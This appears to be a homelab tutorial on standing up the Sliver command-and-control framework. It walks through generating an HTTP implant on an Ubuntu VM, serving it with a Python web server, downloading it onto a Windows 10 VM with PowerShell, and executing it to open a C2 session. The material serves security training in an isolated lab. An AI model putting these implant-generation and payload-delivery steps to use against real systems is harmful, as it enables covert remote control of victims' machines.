# Phase 3: Simulating Attacker Behavior Using Sliver C2

## A) Setting Up Sliver C2 Framework on Ubuntu VM

**Sliver** is a powerful **command and control (C2)** framework designed to provide advanced capabilities for controlling remote systems. It is open-source and can be used for security testing, and unfortunately, by bad actors as well.

> [!NOTE]
> With **Sliver**, security professionals, red teams, and penetration testers can easily establish a secure and reliable communication channel over Mutual TLS, HTTP(S), DNS, or Wireguard with target machines.

### On the Ubuntu VM:

1. Log in with the credentials you set up for your Ubuntu VM.

2. Switch to a **root** command prompt:
   
  ````
  sudo su
  ````
3. We need to ensure the IP address of the Ubuntu VM does not change.
   
   - Find the **ens33** - **inet IP** with the following command:
     
     ````
     ip a
     ````

4. Find the gateway IP address of the VM with the following command:

````
ping _gateway -c 1
````

> [!IMPORTANT]
> Take note of the **Ubuntu VM's IP** and **gateway IP** as you will need it again throughout this project.

</br>

5. Edit the configuration file for the network manager "netplan" with the following command:

````
sudo nano /etc/netplan/00-installer-config.yaml
````

</br>

6. The **GNU nano** page will populate and we will be reconfiguring our adapter from DHCP to a statically assigned IP address:

   - Be sure to adjust the "**xxx**" values to your Ubuntu VM's specific IP address and gateway address.
   - Once done, press "**Ctrl + X**" to **Exit** and **Save the buffer**.
   - File Name to Write: **/etc/netplan/00-installer-config.yaml**
   - Press **Enter**.

</br>

7. Test the new configuration for errors with the following command:

````
sudo netplan try
````

> [!NOTE]
> You can ignore the warning signs about the **deprecated gateway4**.

</br>

8. If there are no errors, apply the configuration:

````
sudo netplan apply
````

</br>

9. Perform a quick connectivity check by pinging the Google DNS:

````
ping 8.8.8.8
````

> [!NOTE]
> We should now have a **statically assigned IP address** that will not change.

</br>

## B) SSH into Ubuntu VM from Host Machine

1. Next, we will **SSH** into the Ubuntu VM from your host system to make command line interface (CLI) actions easier.
    
      - Open a command prompt on your host machine and run the command:

      </br>

     ````
     ssh user@xxx.xxx.xxx.xxx
     ````
      - Be sure to adjust the "**xxx**" values to your Ubuntu VM's IP address.
      - When prompted, type in "**yes**".

</br>

2. From within this new SSH session, proceed with the following instructions to set up our attack **command-and-control (C2) server**.

      - Start with a **root shell**:

     </br>

     ````
     sudo su
     ````
   
3. Run the following command to download **Sliver**:

````
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
````

</br>

4. Make the file **executable** with the following command:

````
chmod +x /usr/local/bin/sliver-server
````

</br>

5. Install **mingw-w64** (short for Minimalist GNU for Windows 64-bit), a toolchain that allows you to generate Windows executables (.exe):

````
apt install -y mingw-w64
````

</br>

6. Create a **working directory** that we will use in the next steps:

````
mkdir -p /opt/sliver
````

</br>

## C) Generating Our C2 Payload

1. While in the **SSH session**, launch the **Sliver server** with the following command:

````
sliver-server
````

![image](https://github.com/user-attachments/assets/2897ce50-d79b-4823-bcd5-bca5543b290d)

</br>

2. Within the **Sliver shell**, generate a **C2 session payload** with the following command:

````
generate --http xxx.xxx.xxx.xxx --save /opt/sliver
````

> [!IMPORTANT]
> Be sure to adjust the "**xxx***" values to those of your Ubuntu VM's IP address.

![image](https://github.com/user-attachments/assets/87225245-3b93-47ee-8968-4997a109efe9)

> [!IMPORTANT]
> Note the randomized name of the **output file**. It will be *unique* each time.

</br>

3. Confirm the new **implant configuration** with the following command:

````
implants
````
![image](https://github.com/user-attachments/assets/c1d2ac90-b9a3-4409-b8c1-d264a1afd7ab)

</br>

4. Now that we have a C2 payload, we can exit Sliver with the following command:

````
exit
````

## D) Downloading C2 Payload Onto Windows 10 VM

While in the **SSH session**, we will use **Python** to download the C2 payload from the **Ubuntu VM** to our **Windows 10 VM**:

1. First, navigate to the following folder:
     
   ````
   cd /opt/sliver
   ````

2. Next, the following **Python** command will spin up a **temporary server**:
     
   ````
   python3 -m http.server 80
   ````

3. Switch to the **Windows 10 VM** and launch an **Administrative PowerShell console**

4. Run the following command to download the C2 payload from the Ubuntu VM:

````
IWR -Uri http://xxx.xxx.xxx.xxx/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
````
> [!IMPORTANT]
> Be sure to adjust the "**xxx**" values to your Ubuntu VM's IP address. Also, adjust the **payload_name** to your unique outfile file name from **Part C: Step 2**.

> [!TIP]
> Adjust the **-Outfile** folder path as needed **(e.g., C:\Users\ *admin* \Downloads\ [payload_name].exe)**.

### Now, let's take a **snapshot** of the Windows 10 VM before we run the malware payload from Sliver.

</br>

## E) Starting the Command & Control (C2) Session

With the payload now on the Windows 10 VM, we will switch back to the **Ubuntu VM SSH session** to enable the **Sliver HTTP server** to catch the callback.

1. First, terminate the **Python** web server we created by pressing "**Ctrl + C**".

2. Next, relaunch **Sliver**:

````
sliver-server
````

3. Start the **Sliver HTTP listener**:

````
http
````

</br>

4. Return to the **Windows 10 VM** and execute the C2 paylod from its **downloaded location** using the same administrative PowerShell prompt from **Part D**:

````
C:\Users\User\Downloads\[payload_name].exe
````

> [!IMPORTANT]
> Adjust the folder path as needed, and input your *unique* payload name.
